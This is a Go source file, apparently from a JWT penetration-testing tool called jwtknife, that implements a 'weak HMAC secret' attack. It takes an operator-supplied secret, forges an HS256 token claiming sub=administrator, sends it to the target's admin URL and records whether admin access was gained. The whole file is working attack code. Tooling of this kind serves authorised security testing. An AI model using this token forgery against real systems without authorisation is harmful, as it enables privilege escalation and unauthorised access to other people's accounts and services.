package jwt

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/golang-jwt/jwt/v5"

	"github.com/spencer5cent/jwtknife/internal/httpx"
	"github.com/spencer5cent/jwtknife/internal/report"
)

type weakHMAC struct{}

func NewWeakHMACAttack() Attack { return weakHMAC{} }

func (weakHMAC) Name() string {
	return "Weak HMAC secret (HS*)"
}

func (weakHMAC) Run(in AttackInput) report.AttackResult {
	ar := report.NewAttackResult("weak-hmac")

	if !strings.HasPrefix(in.ParsedJWT.Alg, "HS") {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "not an HMAC-signed JWT"
		return ar
	}

	fmt.Println("This JWT uses", in.ParsedJWT.Alg)
	fmt.Print("If you already know or suspect the HMAC secret, enter it now (or press Enter to skip): ")

	rd := bufio.NewReader(os.Stdin)
	secret, _ := rd.ReadString('\n')
	secret = strings.TrimSpace(secret)

	if secret == "" {
		ar.Outcome = report.OutcomeNoEffect
		ar.Note = "no secret provided (bruteforce not automated)"
		return ar
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"sub": "administrator",
	})

	signed, err := token.SignedString([]byte(secret))
	if err != nil {
		ar.Outcome = report.OutcomeError
		ar.Errors = append(ar.Errors, err.Error())
		return ar
	}

	r := in.Client.Do(httpx.RequestPlan{
		Label:     "atk-weak-hmac",
		URL:       in.Targets.AdminURL,
		Method:    "GET",
		JWT:       signed,
		Placement: in.Targets.Placement,
	})

	ar.Steps = append(ar.Steps, report.Step{
		Label:   "re-signed-hmac",
		Details: "signed with provided secret, sub=administrator",
		HTTP:    report.FromHTTPResult(r),
		JWT:     report.JWTInfo{Token: signed},
	})

	if report.IsAdminSuccess(in.Baseline, ar.Steps[0].HTTP) {
		ar.Outcome = report.OutcomeSuccess
		ar.Note = "admin access achieved with weak HMAC secret"
		return ar
	}

	if report.IsInteresting(in.Baseline, ar.Steps[0].HTTP) {
		ar.Outcome = report.OutcomeInteresting
		return ar
	}

	ar.Outcome = report.OutcomeNoEffect
	return ar
}
